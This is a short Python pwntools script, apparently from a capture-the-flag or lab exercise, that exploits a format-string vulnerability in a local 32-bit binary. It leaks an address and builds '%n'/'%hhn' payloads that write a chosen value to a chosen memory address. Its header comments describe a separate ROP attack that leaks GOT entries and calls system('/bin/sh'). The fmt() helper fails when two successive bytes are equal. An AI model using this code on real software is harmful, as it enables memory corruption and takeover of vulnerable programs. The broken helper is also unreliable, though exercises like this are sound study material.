#NOTE: payload length should be smaller than read length - offset!!!!!!!
##prerequisite
# 1. write is called, since need to call write@plt to print out write_got.
# 2. have libc, since need to calculate offset for system and 'bin/sh' from write/read
# 3. need to compile with -no-pie, since need to find gadget
# 4. depends on how many single pop|ret gadget could be found, normally only rdi, rsi could be found
from pwn import *
context.log_level = 'debug'


def forc():
    sh = process('./overwrite.32bit')
    c_addr = int(sh.recvuntil('\n', drop=True), 16)
    print hex(c_addr)
    payload = p32(c_addr) + '%12u' + '%6$n'
    print payload
    #gdb.attach(sh)
    sh.sendline(payload)
    print sh.recv()
    sh.interactive()

#forc()

def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev #char size: 0 - 255 for $hhn, use overflow to only print the lowest byte
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr


def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload

def forb():
    sh = process('./overwrite.32bit')
    payload = fmt_str(6, 4, 0x0804A028, 0x12345678) #input str is the 6th argument in stack
#    payload = fmtstr_payload(6, {0x0804A028: 0x12345678})
    print payload
    sh.sendline(payload)
    print sh.recv()
    sh.interactive()

forb()